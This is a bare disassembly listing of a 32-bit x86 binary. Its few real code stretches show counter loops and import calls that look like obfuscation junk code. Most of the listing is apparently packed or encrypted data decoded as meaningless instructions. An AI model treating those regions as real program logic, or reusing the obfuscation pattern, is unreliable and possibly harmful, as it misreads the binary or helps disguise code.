  4050bc:	mov    edx,DWORD PTR [ebp-0x28]
  4050bf:	mov    edi,DWORD PTR [ebp-0x4]
  4050c2:	xor    edx,eax
  4050c4:	inc    DWORD PTR ds:0x4338bb
  4050ca:	xor    edi,eax
  4050cc:	not    DWORD PTR ds:0x43387b
  4050d2:	add    edi,ecx
  4050d4:	add    edx,ecx
  4050d6:	adc    ebx,0x69d8
  4050dc:	imul   edx,edi
  4050df:	mov    edi,DWORD PTR [ebp-0x8]
  4050e2:	mov    ebx,DWORD PTR [ebp-0x10]
  4050e5:	sbb    DWORD PTR ds:0x4337a7,0x433837
  4050ef:	sub    ebx,edi
  4050f1:	mov    DWORD PTR ds:0x43379f,0x4726
  4050fb:	cmp    ebx,edx
  4050fd:	mov    DWORD PTR ds:0x43386b,0x2e42
  405107:	ja     0x4054d4
  40510d:	and    DWORD PTR ds:0x43387f,0x0
  405117:	jmp    0x40512b
  40511c:	xor    edx,edx
  40511e:	add    edx,DWORD PTR ds:0x43387f
  405124:	inc    edx
  405125:	mov    DWORD PTR ds:0x43387f,edx
  40512b:	cmp    DWORD PTR ds:0x43387f,0x17
  405132:	jae    0x40515a
  405138:	cmp    DWORD PTR ds:0x43387f,0x18
  40513f:	jne    0x405155
  405145:	push   0x19d0
  40514a:	push   0x338d
  40514f:	call   DWORD PTR ds:0x412004
  405155:	jmp    0x40511c
  40515a:	mov    edx,DWORD PTR [ebp-0x4]
  40515d:	sbb    DWORD PTR ds:0x43386b,0x4337ef
  405167:	xor    edx,eax
  405169:	xor    DWORD PTR ds:0x433867,0x55d1
  405173:	jmp    0x4054cd
  405178:	cdq    
  405179:	jp     0x4051e8
  40517b:	pushf  
  40517c:	ins    DWORD PTR es:[edi],dx
  40517d:	imul   ebp,DWORD PTR [ecx+0x7b],0x879a2b7f
  405184:	das    
  405185:	cs leave 
  405187:	xor    ah,0x28
  40518a:	jle    0x40520a
  40518c:	xor    edi,DWORD PTR [ebp+0x7e]
  40518f:	jle    0x40515f
  405191:	jp     0x4051a2
  405193:	sahf   
  405194:	jl     0x405125
  405196:	aad    0xbf
  405198:	add    eax,esp
  40519a:	jmp    0x789:0xfc49cda
  4051a1:	adc    eax,DWORD PTR [edi-0x1669a55f]
  4051a7:	pop    ss
  4051a8:	adc    eax,0xea828a2d
  4051ad:	adc    DWORD PTR [ebp+ecx*2+0x22ae3c37],ebx
  4051b4:	sub    eax,DWORD PTR [edx+0x6218650f]
  4051ba:	mov    ah,0x8c
  4051bc:	push   ecx
  4051bd:	adc    DWORD PTR [ebp-0x423c5a8d],0xffffff8f
  4051c4:	imul   esp
  4051c6:	sbb    bl,BYTE PTR [esi]
  4051c8:	rcl    DWORD PTR [ecx],cl
  4051ca:	xor    al,0x26
  4051cc:	cdq    
  4051cd:	mov    DWORD PTR [edx],0xc38ec3a9
  4051d3:	sub    DWORD PTR [bp+0x41],ebp
  4051d7:	mov    ecx,0xf2eb199a
  4051dc:	fld    TBYTE PTR ds:[ecx]
  4051df:	daa    
  4051e0:	out    0x7,al
  4051e2:	pop    es
  4051e3:	adc    dl,cl
  4051e5:	cmc    
  4051e6:	(bad)  
  4051e7:	jp     0x4051e3
  4051e9:	add    ah,BYTE PTR ds:0x79fd0e5f
  4051ef:	adc    al,0x30
  4051f1:	mov    al,0x92
  4051f3:	scas   eax,DWORD PTR es:[edi]
  4051f4:	pop    ebx
  4051f5:	es cli 
  4051f7:	mov    esp,0x1f530d8b
  4051fc:	(bad)  
  4051fd:	jns    0x4051d9
  4051ff:	jp     0x405241
  405201:	mov    gs,WORD PTR [ecx]
  405203:	lds    ecx,FWORD PTR [ecx-0x16]
  405206:	lock lea edx,[ebx-0x57]
  40520a:	stc    
  40520b:	push   eax
  40520c:	or     BYTE PTR [esi*1-0x44bff0cf],dh
  405213:	sub    eax,0xa34d25cd
  405218:	inc    ecx
  405219:	in     eax,dx
  40521a:	scas   eax,DWORD PTR es:[edi]
  40521b:	(bad)  
  40521c:	(bad)  
  40521d:	pop    ebx
  40521e:	dec    esi
  40521f:	das    
  405220:	enter  0x4f42,0x6
  405224:	dec    esp
  405225:	jge    0x40523e
  405227:	push   ebp
  405228:	xlat   BYTE PTR ds:[ebx]
  405229:	iret   
  40522a:	int3   
  40522b:	xchg   edx,eax
  40522c:	push   edi
  40522d:	jne    0x40521e
  40522f:	lods   al,BYTE PTR ds:[esi]
  405230:	dec    eax
  405231:	into   
  405232:	add    eax,0xbaf41197
  405237:	mov    esp,edx
  405239:	mov    edx,0x63ee1772
  40523e:	clc    
  40523f:	cmp    BYTE PTR [edx-0x31],cl
  405242:	add    al,0x8d
  405244:	out    dx,al
  405245:	push   ecx
  405246:	push   ss
  405247:	and    DWORD PTR [ebx+0xe0c0b4a],0xffffffcb
  40524e:	jmp    0xe59df404
  405253:	and    DWORD PTR [ebx-0x63960bbc],edi
  405259:	xlat   BYTE PTR ds:[ebx]
  40525a:	mov    al,0xb0
  40525c:	pop    ss
  40525d:	mov    ebp,0x1d29ed80
  405262:	jecxz  0x40527d
  405264:	jmp    0x405257
  405266:	clc    
  405267:	daa    
  405268:	inc    esi
  405269:	pusha  
  40526a:	sub    ecx,esi
  40526c:	dec    ecx
  40526d:	cwde   
  40526e:	push   0x20
  405270:	dec    BYTE PTR [eax+0xf1c7479]
  405276:	das    
  405277:	pop    ss
  405278:	push   ecx
  405279:	fmul   DWORD PTR [eax-0x4]
  40527c:	js     0x405250
  40527e:	jb     0x4052ab
  405280:	push   ecx
  405281:	jmp    0xd5881fa5
  405286:	or     ch,BYTE PTR [esi]
  405288:	shl    DWORD PTR [ebx-0x55],1
  40528b:	mov    al,ds:0x8de5e06
  405290:	xor    al,BYTE PTR [esi+ebx*8]
  405293:	sbb    al,0x91
  405295:	inc    DWORD PTR [esi]
  405297:	shl    BYTE PTR [ebx-0x1f8686c7],0xf8
  40529e:	mov    dl,0x3c
  4052a0:	adc    ah,BYTE PTR [edi+0x2a9f5248]
  4052a6:	xchg   esi,eax
  4052a7:	repnz push eax
  4052a9:	push   edx
  4052aa:	fcmovnu st,st(7)
  4052ac:	sbb    eax,0xd4dcaf75
  4052b1:	push   ecx
  4052b2:	call   0x9b46d41e
  4052b7:	jmp    0x405291
  4052b9:	pushf  
  4052ba:	rcr    BYTE PTR [ebp+0x718e42f9],1
  4052c0:	jo     0x405289
  4052c2:	mov    ah,0xf8
  4052c4:	xchg   ecx,eax
  4052c5:	pop    ss
  4052c6:	loop   0x405280
  4052c8:	add    DWORD PTR [ebx-0x77],ecx
  4052cb:	and    ah,BYTE PTR [edi-0x42]
  4052ce:	dec    ebx
  4052cf:	mov    eax,ds:0xb3c1e952
  4052d4:	sub    eax,0x24fd93c6
  4052d9:	cmp    bh,BYTE PTR ds:0x99f23293
  4052df:	dec    edi
  4052e0:	add    BYTE PTR [edx-0x4c20e63],bh
  4052e6:	stos   BYTE PTR es:[edi],al
  4052e7:	out    dx,eax
  4052e8:	sub    DWORD PTR [edx],0x9bcc41d7
  4052ee:	adc    eax,0x966d154a
  4052f3:	push   0x54a76b05
  4052f8:	sar    BYTE PTR [edi+0x1a80c5ab],1
  4052fe:	and    eax,0xa916910
  405303:	fsub   st,st(0)
  405305:	(bad)  
  405307:	mov    ch,0x84
  405309:	sbb    esp,DWORD PTR [ebx+eax*1-0x5f]
  40530d:	lds    esp,FWORD PTR [eax-0x469902c5]
  405313:	fadd   QWORD PTR [ecx]
  405315:	pop    edx
  405316:	ret    0x93b5
  405319:	imul   eax,DWORD PTR [ebx+0xe515591],0x5c893582
  405323:	enter  0xd58d,0x11
  405327:	xlat   BYTE PTR ds:[ebx]
  405328:	mov    ds:0xa99ccaab,al
  40532d:	pop    edx
  40532e:	xchg   esi,eax
  40532f:	jmp    FWORD PTR ds:0x225aec4c
  405335:	mov    bl,0xce
  405337:	xor    ecx,DWORD PTR [ecx]
  405339:	test   eax,0x7925e52f
  40533e:	xchg   esi,eax
  40533f:	mov    bh,0xd7
  405341:	mov    ebp,0x86d91529
  405346:	lods   eax,DWORD PTR ds:[esi]
  405347:	sbb    BYTE PTR es:[ebx],bh
  40534a:	push   ecx
  40534b:	ss push 0xffffffdd
  40534e:	rol    DWORD PTR [edi+eiz*8],cl
  405351:	push   esp
  405352:	das    
  405353:	leave  
  405354:	lahf   
  405355:	and    esi,DWORD PTR [esi]
  405357:	retf   0xd92d
  40535a:	push   ebp
  40535b:	push   eax
  40535c:	sbb    al,0x54
  40535e:	mov    dl,0x91
  405360:	pop    esp
  405361:	fld    TBYTE PTR [eax]
  405363:	xchg   DWORD PTR [edx-0x6ecb70d4],edx
  405369:	add    edi,ecx
  40536b:	add    al,0x3
  40536d:	push   0xd28bef4f
  405372:	xor    dh,BYTE PTR [edi-0xf6ba093]
  405378:	cld    
  405379:	jno    0x4053c9
  40537b:	lods   al,BYTE PTR ds:[esi]
  40537c:	or     DWORD PTR [edi],0x1f
  40537f:	clc    
  405380:	in     eax,dx
  405381:	jecxz  0x405357
  405383:	inc    esp
  405384:	ja     0x405398
  405386:	sbb    edi,eax
  405388:	pop    esp
  405389:	push   ss
  40538a:	aaa    
  40538b:	xchg   edi,eax
  40538c:	or     DWORD PTR [esi-0x19b9c10a],0xffffffdb
  405393:	xchg   DWORD PTR [edi-0x53],esp
  405396:	sub    al,cl
  405398:	int    0xf8
  40539a:	cmp    DWORD PTR ds:0x8713da93,0xc81f53f5
  4053a4:	jno    0x4053e3
  4053a6:	fadd   DWORD PTR [eax-0x65]
  4053a9:	sub    esp,DWORD PTR [ecx-0x46]
  4053ac:	stos   DWORD PTR es:[edi],eax
  4053ad:	and    edi,esp
  4053af:	adc    al,0x86
  4053b1:	pop    ecx
  4053b2:	xor    ah,ah
  4053b4:	jge    0x40534c
  4053b6:	daa    
  4053b7:	dec    ebx
  4053b8:	sar    BYTE PTR [ebx-0x2f16cb55],1
  4053be:	imul   ebp,ebp,0x57cf593
  4053c4:	cs xchg bh,al
  4053c7:	jae    0x40543a
  4053c9:	js     0x405422
  4053cb:	aas    
  4053cc:	fstp   TBYTE PTR [edi-0x1b]
  4053cf:	push   eax
  4053d0:	push   esp
  4053d1:	ins    BYTE PTR es:[edi],dx
  4053d2:	rcl    DWORD PTR ds:0xcb8909f0,cl
  4053d8:	int3   
  4053d9:	adc    ebx,DWORD PTR [ebp-0x139951a4]
  4053df:	sub    ebx,esp
  4053e1:	int3   
  4053e2:	aam    0x79
  4053e4:	and    BYTE PTR [edx],ah
  4053e6:	(bad)  
  4053e7:	fcmovbe st,st(7)
  4053e9:	and    BYTE PTR [ebx-0x22],al
  4053ec:	dec    edx
  4053ed:	add    eax,0xf9604121
  4053f2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4053f3:	mov    bh,0xb
  4053f5:	and    DWORD PTR [esi],eax
  4053f7:	aas    
  4053f8:	sbb    bh,dl
  4053fa:	popa   
  4053fb:	loopne 0x4053d1
  4053fd:	dec    ebx
  4053fe:	add    ch,BYTE PTR [esi]
  405400:	enter  0x9beb,0xbe
  405404:	fdivp  st(3),st
  405406:	xchg   ecx,eax
  405407:	fxch   st(6)
  405409:	sbb    ebp,DWORD PTR [esi+0x5249983f]
  40540f:	add    ch,al
  405411:	adc    dl,cl
  405413:	(bad)  
  405415:	(bad)  
  405416:	or     eax,0x5f388154
  40541b:	push   edi
  40541c:	sbb    BYTE PTR [eax-0x77],ch
  40541f:	xchg   esi,eax
  405420:	push   0x34c800c4
  405425:	pop    ebx
  405426:	xchg   BYTE PTR [eax-0xb],bh
  405429:	jb     0x4053be
  40542b:	push   ecx
  40542c:	push   edx
  40542d:	mov    bl,0xea
  40542f:	adc    cl,al
  405431:	jmp    0x4053be
  405433:	add    bl,BYTE PTR [edi+eax*2]
  405436:	aad    0x8a
  405438:	inc    edx
  405439:	ss pop esi
  40543b:	push   ebx
  40543c:	mov    DWORD PTR [eax],ebx
  40543e:	dec    edx
  40543f:	jo     0x405439
  405441:	and    DWORD PTR [esi],edx
  405443:	rol    DWORD PTR gs:[ecx+0x5d2a9ad1],cl
  40544a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40544b:	mov    ecx,0x6b5f6bf0
  405450:	sbb    DWORD PTR [eax-0x61],edi
  405453:	jl     0x4053e4
  405455:	mov    bl,0xdb
  405457:	adc    cl,BYTE PTR [ecx-0x5db03b21]
  40545d:	(bad)  
  40545e:	fsub   st(4),st
  405460:	pop    ebp
  405461:	push   0x71
  405463:	mov    BYTE PTR [ebx+ebp*4+0x70],bl
  405467:	pop    es
  405468:	sti    
  405469:	adc    al,0xfe
  40546b:	xchg   ecx,eax
  40546c:	push   ecx
  40546d:	ret    
  40546e:	not    DWORD PTR [eax-0x5a2a4370]
  405474:	sub    eax,0xba0b0998
  405479:	call   0xa393:0x22a51418
  405480:	sahf   
  405481:	fisubr DWORD PTR [edi-0x56938c0b]
  405487:	aaa    
  405488:	(bad)  
  405489:	std    
  40548a:	addr16 int 0x71
  40548d:	mov    esi,DWORD PTR [ecx+0x43]
  405490:	lahf   
  405491:	dec    esp
  405492:	push   edx
  405493:	lea    eax,[ecx+0x567566c7]
  405499:	aaa    
  40549a:	xor    bh,BYTE PTR [ebx]
  40549c:	and    al,BYTE PTR [ebp-0x59]
  40549f:	lock cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4054a1:	sub    DWORD PTR [eax-0x39773c17],esi
  4054a7:	lea    ecx,ds:0xd4d2dccc
  4054ad:	nop
  4054ae:	mov    ecx,0x461bd6f4
  4054b3:	jnp    0x405504
  4054b5:	jne    0x4054c3
  4054b7:	js     0x4054d6
  4054b9:	in     al,0xac
  4054bb:	outs   dx,BYTE PTR ds:[esi]
  4054bc:	jb     0x40548b
  4054be:	inc    esp
  4054bf:	pop    ebp
  4054c0:	xchg   ebp,eax
  4054c1:	hlt    
  4054c2:	mov    ds:0x217acd9,eax
  4054c7:	arpl   cx,sp
  4054c9:	push   ebp
  4054ca:	ror    DWORD PTR [edi-0x162efc8b],cl
  4054d0:	push   ss
  4054d1:	sldt   WORD PTR [eax]
  4054d4:	mov    edx,DWORD PTR [ebp-0x2c]
  4054d7:	mov    edi,DWORD PTR [ebp-0x4]
  4054da:	xor    edx,eax
  4054dc:	movzx  ebx,BYTE PTR ds:0x433867
  4054e3:	or     DWORD PTR ds:0x433883,ebx
  4054e9:	xor    edi,eax
  4054eb:	and    DWORD PTR ds:0x433873,0x0
  4054f5:	xor    ebx,ebx
  4054f7:	add    ebx,DWORD PTR ds:0x433873
  4054fd:	inc    ebx
  4054fe:	mov    DWORD PTR ds:0x433873,ebx
  405504:	cmp    DWORD PTR ds:0x433873,0x6
  40550b:	jne    0x40552b
  405511:	push   0x1804
  405516:	push   0x80d8
  40551b:	push   0x74bc
  405520:	push   0x5a14
  405525:	call   DWORD PTR ds:0x412370
  40552b:	cmp    DWORD PTR ds:0x433873,0x5
  405532:	jne    0x405545
  405538:	mov    ebx,DWORD PTR ds:0x433873
  40553e:	inc    ebx
  40553f:	mov    DWORD PTR ds:0x433873,ebx
  405545:	cmp    DWORD PTR ds:0x433873,0x1e
  40554c:	jb     0x4054f5
  405552:	mov    DWORD PTR ds:0x433877,0x387c
  40555c:	add    edi,ecx
  40555e:	add    edx,ecx
  405560:	imul   edx,edi
  405563:	mov    edi,DWORD PTR [ebp-0x8]
  405566:	and    DWORD PTR ds:0x433837,0x0
  405570:	mov    ebx,DWORD PTR ds:0x433837
  405576:	inc    ebx
  405577:	mov    DWORD PTR ds:0x433837,ebx
  40557d:	cmp    DWORD PTR ds:0x433837,0x2c
  405584:	jne    0x4055b0
  40558a:	push   DWORD PTR [ebp-0x28]
  40558d:	push   0x7933
  405592:	push   0x4339c6
  405597:	push   DWORD PTR [ebp-0x28]
  40559a:	push   DWORD PTR [ebp-0x24]
  40559d:	push   DWORD PTR [ebp-0x1c]
  4055a0:	push   0x42e0
  4055a5:	push   0x392f
  4055aa:	call   DWORD PTR ds:0x412374
  4055b0:	cmp    DWORD PTR ds:0x433837,0x1e
  4055b7:	jb     0x405570
  4055bd:	mov    ebx,DWORD PTR [ebp-0x10]
  4055c0:	sub    ebx,edi
  4055c2:	cmp    ebx,edx
  4055c4:	ja     0x4055d2
  4055ca:	mov    edx,DWORD PTR [ebp-0x28]
  4055cd:	jmp    0x4063dc
  4055d2:	mov    edx,DWORD PTR [ebp-0x30]
  4055d5:	mov    edi,DWORD PTR [ebp-0x4]
  4055d8:	xor    edx,eax
  4055da:	xor    edi,eax
  4055dc:	add    edi,ecx
  4055de:	add    edx,ecx
  4055e0:	imul   edx,edi
  4055e3:	mov    edi,DWORD PTR [ebp-0x8]
  4055e6:	mov    ebx,DWORD PTR [ebp-0x10]
  4055e9:	sub    ebx,edi
  4055eb:	cmp    ebx,edx
  4055ed:	ja     0x4055fb
  4055f3:	mov    edx,DWORD PTR [ebp-0x2c]
  4055f6:	jmp    0x4063dc
  4055fb:	mov    edx,DWORD PTR [ebp-0x34]
  4055fe:	mov    edi,DWORD PTR [ebp-0x4]
  405601:	xor    edx,eax
  405603:	xor    edi,eax
  405605:	add    edi,ecx
  405607:	add    edx,ecx
  405609:	imul   edx,edi
  40560c:	mov    edi,DWORD PTR [ebp-0x8]
  40560f:	mov    ebx,DWORD PTR [ebp-0x10]
  405612:	sub    ebx,edi
  405614:	cmp    ebx,edx
  405616:	ja     0x40597e
  40561c:	jmp    0x405976
  405621:	(bad)  [eax+0x65]
  405624:	pop    eax
  405625:	jne    0x405698
  405627:	loope  0x405672
  405629:	clc    
  40562a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562b:	dec    ebp
  40562c:	push   0xb83635a5
  405631:	test   eax,0x337e7e37
  405636:	jge    0x4056b6
  405638:	jle    0x40560a
  40563a:	or     eax,0x40c93c82
  40563f:	jp     0x405632
  405641:	push   esi
  405642:	fsub   QWORD PTR [edi-0x48589da2]
  405648:	lods   eax,DWORD PTR ds:[esi]
  405649:	retf   
  40564a:	shr    BYTE PTR [esi],cl
  40564c:	shl    DWORD PTR [ebp+0x58c2fb12],cl
  405652:	sti    
  405653:	xchg   ebx,eax
  405654:	(bad)  
  405655:	jmp    0x405620
  405657:	xor    eax,0xc885885e
  40565c:	add    BYTE PTR [ecx-0x32],0x15
  405660:	pop    ebx
  405661:	mov    fs,WORD PTR [edx+0x6b87891e]
  405667:	jge    0x4056a4
  405669:	mov    BYTE PTR [eax-0x76],ah
  40566c:	lods   eax,DWORD PTR ds:[esi]
  40566d:	scas   al,BYTE PTR es:[edi]
  40566e:	adc    eax,0x95032dac
  405673:	lods   eax,DWORD PTR ds:[esi]
  405674:	and    al,dh
  405676:	adc    bh,dl
  405678:	stos   DWORD PTR es:[edi],eax
  405679:	je     0x40560c
  40567b:	sub    eax,0x4ea45bfc
  405680:	dec    ebp
  405681:	inc    ebp
  405682:	mov    eax,ds:0x7b379bfa
  405687:	es aas 
  405689:	sbb    BYTE PTR [edx-0x13fb2376],0xd4
  405690:	ds out 0xf5,eax
  405693:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405694:	or     al,0x27
  405696:	inc    ebp
  405697:	sbb    ch,BYTE PTR [esi-0x553fc050]
  40569d:	or     bl,BYTE PTR fs:[esi+ecx*2-0x125df20e]
  4056a5:	mov    dl,0x89
  4056a7:	mov    al,ds:0x309e843
  4056ac:	cmp    al,BYTE PTR [edx-0x74107174]
  4056b2:	jnp    0x40568a
  4056b4:	sbb    dh,BYTE PTR [eax-0x7fb08743]
  4056ba:	jl     0x405717
  4056bc:	jns    0x40566d
  4056be:	mov    bh,0x51
  4056c0:	pop    esp
  4056c1:	cmp    DWORD PTR [ebx+0x42ed4849],esi
  4056c7:	inc    esi
  4056c8:	dec    ebx
  4056c9:	cmp    edx,DWORD PTR [ebx-0x1c]
  4056cc:	fidivr DWORD PTR [ecx-0x7]
  4056cf:	enter  0x6d73,0x92
  4056d3:	shl    BYTE PTR [ebp-0x6c],cl
  4056d6:	inc    ebp
  4056d7:	fmul   DWORD PTR [ebp+0x792fc4e3]
  4056de:	pop    esi
  4056df:	out    0xea,eax
  4056e1:	dec    edi
  4056e2:	jecxz  0x40571e
  4056e4:	xchg   ebp,eax
  4056e5:	mov    bh,0x40
  4056e7:	adc    BYTE PTR [edi+0x1],dh
  4056ea:	and    DWORD PTR [ebx],edx
  4056ec:	js     0x405733
  4056ee:	mov    esi,0xc97fb6f8
  4056f3:	inc    esi
  4056f4:	jns    0x4056a7
  4056f6:	pop    edx
  4056f7:	sar    BYTE PTR [esi+0xe7fabbe],1
  4056fd:	xchg   esi,eax
  4056fe:	xchg   esp,eax
  4056ff:	xchg   ebp,eax
  405700:	(bad)  
  405701:	pop    edx
  405702:	aad    0x49
  405704:	xchg   ecx,eax
  405705:	cmc    
  405706:	daa    
  405707:	fwait
  405708:	jnp    0x4056c9
  40570a:	and    DWORD PTR [ebp+0x19a09aef],esi
  405710:	popf   
  405711:	sub    al,0xf6
  405713:	pushf  
  405714:	mov    ecx,0xc1fa9a7d
  405719:	fcom   QWORD PTR [ebp+eiz*8-0x3f]
  40571d:	cwde   
  40571e:	retf   0xcde7
  405721:	push   es
  405722:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405723:	lods   eax,DWORD PTR ds:[esi]
  405724:	jne    0x4056d6
  405726:	and    esi,DWORD PTR [ecx]
  405728:	scas   eax,DWORD PTR es:[edi]
  405729:	scas   al,BYTE PTR es:[edi]
  40572a:	dec    esp
  40572b:	and    ah,BYTE PTR [ecx]
  40572d:	cmp    DWORD PTR [esi],ebx
  40572f:	pop    ebp
  405730:	test   ebx,ebp
  405732:	ret    0x9ad8
  405735:	imul   ebx,DWORD PTR [ebp-0x7e],0x2d
  405739:	push   esi
  40573a:	jle    0x405795
  40573c:	xchg   BYTE PTR [ebp+0x6088bed4],dh
  405742:	inc    esp
  405743:	pop    ecx
  405744:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405745:	add    eax,0x6a6d07ef
  40574a:	imul   DWORD PTR [ecx-0x5942741d]
  405750:	ss scas eax,DWORD PTR es:[edi]
  405752:	pop    edi
  405753:	and    DWORD PTR [edi],esp
  405755:	sub    DWORD PTR [edx],ebx
  405757:	sbb    BYTE PTR [esi],dh
  405759:	mov    ebp,0xc7e21a8a
  40575e:	or     BYTE PTR [ecx+0x74c7d78e],ch
  405764:	sahf   
  405765:	aas    
  405766:	ret    
  405767:	test   DWORD PTR [esi+ebx*1+0x49],eax
  40576b:	gs cmc 
  40576d:	cli    
  40576e:	div    DWORD PTR ds:0xd1e1743b
  405774:	mov    ebx,eax
  405776:	adc    BYTE PTR [edx+0x65],ah
  405779:	fstp   TBYTE PTR [esp+ebx*2+0x31]
  40577d:	(bad)  [esi]
  40577f:	(bad)  
  405780:	or     edi,esi
  405782:	test   BYTE PTR [eax],dh
  405784:	rcr    BYTE PTR [eax+0x7a],1
  405787:	sahf   
  405788:	aas    
  405789:	sub    eax,DWORD PTR [edi]
  40578b:	fs test eax,0x12ee5f18
  405791:	cmc    
  405792:	scas   eax,DWORD PTR es:[edi]
  405793:	xor    DWORD PTR [ebx+ebx*4-0x20],edx
  405797:	data16 cli 
  405799:	add    DWORD PTR [edi+esi*2],0x6b5e9691
  4057a0:	jmp    0xeb43:0x7f098a8a
  4057a7:	ins    DWORD PTR es:[edi],dx
  4057a8:	lahf   
  4057a9:	stos   DWORD PTR es:[edi],eax
  4057aa:	and    BYTE PTR [ecx+0x32643803],0xcc
  4057b1:	xchg   ebp,eax
  4057b2:	loopne 0x405776
  4057b4:	mov    DWORD PTR [ebx],esp
  4057b6:	jmp    0x639d4b53
  4057bb:	je     0x405811
  4057bd:	add    ecx,esp
  4057bf:	jmp    0xe01e:0xa4cae82
  4057c6:	in     eax,0xb8
  4057c8:	(bad)  
  4057c9:	aam    0x2a
  4057cb:	mov    eax,0x42b61829
  4057d0:	xchg   ebx,eax
  4057d1:	mov    esp,?
  4057d3:	jge    0x4057f5
  4057d5:	ins    BYTE PTR es:[edi],dx
  4057d6:	sbb    dl,al
  4057d8:	cwde   
  4057d9:	fmul   QWORD PTR [esi-0x50dd3387]
  4057df:	outs   dx,BYTE PTR ds:[esi]
  4057e0:	cmp    eax,0x14e74f6a
  4057e5:	ins    BYTE PTR es:[edi],dx
  4057e6:	mov    ebp,0x1d799c31
  4057eb:	xor    al,bh
  4057ed:	retf   0xb391
  4057f0:	repz sub eax,0x2fb5b80c
  4057f6:	outs   dx,DWORD PTR ds:[esi]
  4057f7:	fld    DWORD PTR [eax]
  4057f9:	in     eax,0xc1
  4057fb:	dec    edx
  4057fc:	mov    bl,0x60
  4057fe:	sbb    edx,DWORD PTR [eax-0x4f]
  405801:	retf   0x69b9
  405804:	push   eax
  405805:	jl     0x40578c
  405807:	xor    DWORD PTR [ebp+0x4446d8ff],esp
  40580d:	stc    
  40580e:	cdq    
  40580f:	mov    DWORD PTR [esp+ebp*4-0x4b],0x60566f79
  405817:	stos   DWORD PTR es:[edi],eax
  405818:	mov    ss:0xfa6d68e3,eax
  40581e:	sbb    DWORD PTR [eax-0x14227091],edi
  405824:	push   esp
  405825:	shr    dh,0xe8
  405828:	fsincos 
  40582a:	pop    edi
  40582b:	lods   eax,DWORD PTR ds:[esi]
  40582c:	es jno 0x40589b
  40582f:	std    
  405830:	jb     0x405852
  405832:	or     bl,cl
  405834:	mov    esp,0xd5224ab7
  405839:	cmove  ebx,ecx
  40583c:	mov    al,0x20
  40583e:	adc    al,0xd
  405840:	sbb    ch,BYTE PTR [ecx]
  405842:	rcl    BYTE PTR [edx],0x9
  405845:	cli    
  405846:	sbb    DWORD PTR [ecx],edi
  405848:	sub    al,0xff
  40584a:	cmc    
  40584b:	sub    al,0x3f
  40584d:	jo     0x40589e
  40584f:	das    
  405850:	inc    esp
  405851:	loopne 0x405806
  405853:	push   0x27a7c0a9
  405858:	cmp    BYTE PTR [ebx+0x41ca38ef],0x23
  40585f:	dec    ebp
  405860:	adc    DWORD PTR [eax],0x6
  405863:	(bad)  
  405864:	pop    es
  405865:	fsubr  QWORD PTR [edx+0x1e]
  405868:	or     BYTE PTR [esi-0x35],bl
  40586b:	xchg   BYTE PTR [edi],cl
  40586d:	jb     0x4058a3
  40586f:	inc    edi
  405870:	(bad)  
  405872:	pop    edx
  405873:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405874:	retf   0x2a93
  405877:	xchg   ecx,eax
  405878:	call   0x4fe2a790
  40587d:	ins    DWORD PTR es:[edi],dx
  40587e:	lds    edi,FWORD PTR [edx+ecx*2-0x4e]
  405882:	inc    ecx
  405883:	es (bad) 
  405885:	cmp    eax,0xe7d62a84
  40588a:	sahf   
  40588b:	dec    ecx
  40588c:	js     0x40581f
  40588e:	or     esp,DWORD PTR [esi+0x51437441]
  405894:	idiv   al
  405896:	scas   al,BYTE PTR es:[edi]
  405897:	or     eax,0x17f19b12
  40589c:	xchg   edi,eax
  40589d:	add    ebp,DWORD PTR [edi]
  40589f:	repz xchg edi,eax
  4058a1:	push   ebx
  4058a2:	(bad)  
  4058a3:	fwait
  4058a4:	arpl   WORD PTR [ebx-0x1e],dx
  4058a7:	sub    ah,BYTE PTR [ebp-0x23]
  4058aa:	fdivr  DWORD PTR [ebp+esi*1-0xd93f561]
  4058b1:	aaa    
  4058b2:	out    dx,al
  4058b3:	loope  0x4058d3
  4058b5:	lahf   
  4058b6:	scas   eax,DWORD PTR es:[edi]
  4058b7:	stc    
  4058b8:	xor    BYTE PTR [ebx-0x1e9fa755],bl
  4058be:	pop    es
  4058bf:	(bad)  
  4058c1:	iret   
  4058c2:	loopne 0x405922
  4058c4:	hlt    
  4058c5:	or     DWORD PTR [eax+0x55d2ef9c],edi
  4058cb:	aam    0x99
  4058cd:	loopne 0x405865
  4058cf:	lea    edi,[esi-0x5b]
  4058d2:	int3   
  4058d3:	push   0xffffff97
  4058d5:	mov    ds:0x9340ce2e,al
  4058da:	test   BYTE PTR [eax+eiz*1-0x1e],0x22
  4058df:	icebp  
  4058e0:	or     BYTE PTR [ebx-0x7b],ch
  4058e3:	or     al,0x6a
  4058e5:	mov    BYTE PTR [edi-0x68098169],dh
  4058eb:	loop   0x405921
  4058ed:	lahf   
  4058ee:	cwde   
  4058ef:	dec    esi
  4058f0:	mov    ds:0x235a3a4c,al
  4058f5:	aad    0x27
  4058f7:	mov    dh,BYTE PTR [edx-0x74]
  4058fa:	and    esi,DWORD PTR [edi+0x4cfe3d68]
  405900:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405901:	int    0x61
  405903:	mov    dh,ch
  405905:	ins    BYTE PTR es:[edi],dx
  405906:	rcl    ecx,cl
  405908:	gs in  eax,dx
  40590a:	aam    0xca
  40590c:	dec    edx
  40590d:	fwait
  40590e:	mov    al,ds:0xf741e08a
  405913:	cld    
  405914:	dec    ebp
  405915:	dec    ebp
  405916:	jb     0x4058b5
  405918:	jmp    0x9f07e412
  40591d:	xor    eax,0xd19ef92e
  405922:	pop    ss
  405923:	sbb    BYTE PTR [esi],0xd8
  405926:	out    0xad,eax
  405928:	adc    BYTE PTR [ecx+0x52],dh
  40592b:	xor    esi,DWORD PTR [ebx-0x65]
  40592e:	push   0x57b23910
  405933:	inc    edx
  405934:	pusha  
  405935:	pop    ds
  405936:	push   0xf073a878
  40593b:	(bad)  
  40593c:	das    
  40593d:	hlt    
  40593e:	mov    bh,0x62
  405940:	cs out 0x32,eax
  405943:	or     DWORD PTR [ebx-0x7bcad8e3],edi
  405949:	stos   BYTE PTR es:[edi],al
  40594a:	push   ebx
  40594b:	in     al,dx
  40594c:	out    dx,eax
  40594d:	mov    ch,0x6d
